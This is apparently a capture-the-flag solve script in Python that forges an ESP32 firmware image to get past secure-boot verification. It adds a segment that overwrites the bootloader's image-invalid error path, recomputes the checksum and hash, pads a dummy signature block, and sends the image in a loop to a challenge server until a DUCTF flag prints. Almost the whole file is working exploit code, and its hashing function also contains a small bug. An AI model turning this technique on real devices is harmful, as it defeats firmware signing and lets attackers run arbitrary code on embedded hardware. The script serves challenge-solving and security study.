#!/usr/bin/python3

# useful commands:
# esptool.py --chip esp32 image_info --version 2 payload.bin
# esptool.py --chip esp32 elf2image --flash_mode="dio" --flash_freq "40m" --flash_size "4MB" -o main.bin main.elf

# this will work if we reuse the original hello-world.bin from the challenge, even though that sucks:
# dd if=./flash-base.bin of=./build/hello-world.bin skip=131072 bs=1 count=196528

import os
import sys
import struct
import hashlib
import base64
from pwnlib.tubes.remote import remote

class FlagFound(Exception):
    pass

ESP_ROM_CHECKSUM_INITIAL = 0xEF
SEGMENT_COUNT_OFFSET     = 0x1
VERIFIED_BOOT_OFFSET     = 0x17
ESP_IMAGE_HEADER_SZ      = 0x18 # sizeof(esp_image_header_t)
SEGMENT_HEADER_SIZE      = 8    # sizeof(esp_image_segment_header_t)

def segment_metadata(fw, offset):
    load_addr   = int.from_bytes(fw[offset:offset+4], byteorder='little')
    data_size   = int.from_bytes(fw[offset+4:offset+SEGMENT_HEADER_SIZE], byteorder='little')
    data_offset = offset + SEGMENT_HEADER_SIZE
    data_end    = data_offset + data_size
    return load_addr, data_size, data_offset, data_end

def update_checksum(fw):
  xorsum = ESP_ROM_CHECKSUM_INITIAL
  offset = ESP_IMAGE_HEADER_SZ
  for segment in range(0, fw[SEGMENT_COUNT_OFFSET]):
      load_addr, data_size, data_offset, data_end = segment_metadata(fw, offset)
      print(f"parsing segment {segment:02x}")
      print(f"  load_addr: {load_addr:08x}")
      print(f"  data_size: {data_size:08x}")
      # update checksum
      for byte in fw[data_offset:data_end]:
        xorsum ^= byte
      offset = data_end
  alignment = 16
  padding = (alignment - (len(fw[:data_end]) % alignment)) % alignment
  if padding > 0:
      fw = fw[:data_end] + bytearray(padding)
  # last byte is the checksum byte
  fw[-1] = xorsum
  print(f"Updated checksum: {xorsum:02x}")
  return fw

def add_segment(fw, load_addr, data):
  # find last segment
  offset = ESP_IMAGE_HEADER_SZ
  for segment in range(0, fw[SEGMENT_COUNT_OFFSET]):
    laddr, data_size, data_offset, data_end = segment_metadata(fw, offset)
    offset = data_end

  data_size = len(data)
  fw  = fw[:offset] + load_addr + data_size.to_bytes(4, byteorder='little') + data + fw[offset:]
  fw[SEGMENT_COUNT_OFFSET] += 1
  return fw

def update_sha256sum(fw):
  sha256_hash = hashlib.sha256()
  sha256_hash.update(firmware)
  print(f"Calculated hash: {sha256_hash.hexdigest()}")
  fw += bytearray(sha256_hash.digest())
  return fw

if __name__=="__main__":
  f = open("esp-idf/examples/get-started/hello_world/build/hello-world.bin", "rb")
  firmware = bytearray(f.read())
  f.close()

  # remove verified hash temporarily (last 32 bytes of file)
  # technically we could set this to 0 and remove entirely
  # but lets just keep it anwyay
  if firmware[VERIFIED_BOOT_OFFSET] == 1:
    firmware = firmware[:-32]

  #
  # components/esp32/esp_err_to_name.c:    ERR_TBL_IT(ESP_ERR_IMAGE_INVALID),                      /*  8194 0x2002 */
  # 
  #                             LAB_40079ff4                                    XREF[1]:     40079fdb(j)  
  #      40079ff4 25 86 fe        call8      esp_log_early_timestamp                          uint32_t esp_log_early_timestamp
  #      40079ff7 c1 b8 f8        l32r       a12,PTR_s_esp_image_400782d8                     = 3fff10ec
  #      40079ffa bd 0a           mov.n      a11,a10
  #      40079ffc a1 cb f8        l32r       a10,PTR_DAT_40078328                             = 3fff1460
  #      40079fff 81 25 f8        l32r       a8,DAT_40078094                                  = 40007D54h
  #      4007a002 e0 08 00        callx8     a8=>s_esp_image_3fff10ec                         = "esp_image"
  #      4007a005 21 b3 f8        l32r       a2,ESP_ERR_IMAGE_INVALID                         = 2002h
  #      4007a008 1d f0           retw.n

  load_addr = b"\x05\xa0\x07\x40"
  payload   = b"ABCD" # let the gods of entropy hack for us!

  firmware = add_segment(firmware, load_addr, payload)
  firmware = update_checksum(firmware)

  # add verified hash back if required
  if firmware[VERIFIED_BOOT_OFFSET] == 1:
    firmware = update_sha256sum(firmware)

  # verify_secure_boot_signature() needs to read another 68 bytes (esp_secure_boot_sig_block_t)
  firmware += b"\x00\x00\x00\x00"     # version
  firmware += bytearray(b"D" * 0x40)  # signature

  conn = remote("challenge", 1337)
  conn.sendline(base64.b64encode(firmware))
  while True:
    conn = remote("challenge", 1337)
    conn.sendline(base64.b64encode(firmware))
    try:
      while True:
        res = conn.recvline(timeout=1)
        if b'' == res:
          break
        res = res.strip(b'\r\n').decode()
        print(res)
        if 'epc1=' in res:
          break
        if 'DUCTF' in res:
          raise FlagFound
    except EOFError:
      pass
    except FlagFound:
      break
    finally:
      conn.close()
